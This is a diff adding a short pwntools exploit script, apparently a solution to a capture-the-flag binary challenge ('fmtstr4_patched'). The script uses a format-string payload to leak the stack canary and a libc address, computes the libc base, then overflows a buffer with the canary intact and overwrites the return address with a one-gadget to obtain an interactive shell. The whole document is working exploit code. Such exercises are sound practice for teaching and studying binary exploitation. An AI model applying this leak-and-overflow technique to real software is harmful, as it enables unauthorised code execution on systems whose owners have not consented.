@@ -1,0 +1,25 @@
+from pwn import *
+
+p = process("./fmtstr4_patched")
+'''
+p = gdb.debug("./fmtstr4_patched", gdbscript = 
+b *main
+r
+)
+'''
+
+payload = b"01234456789%21$p%23$p"
+p.sendafter(b"ID: ", payload)
+payload = b"&WPAbC&M!%8S5X#W"
+p.sendafter(b"Password: ", payload)
+
+s = p.recvuntil("E").decode()[:-1:].split("0x")
+canary = int(s[1], 16)
+libc_base = int(s[2], 16) - 147587
+print(hex(canary), hex(libc_base))
+one_shot = libc_base + 0xe3b01
+
+payload = b'A' * 0x38 + p64(canary) + b'B' * 0x8 + p64(one_shot)
+p.sendafter(b"secret: ", payload)
+
+p.interactive()
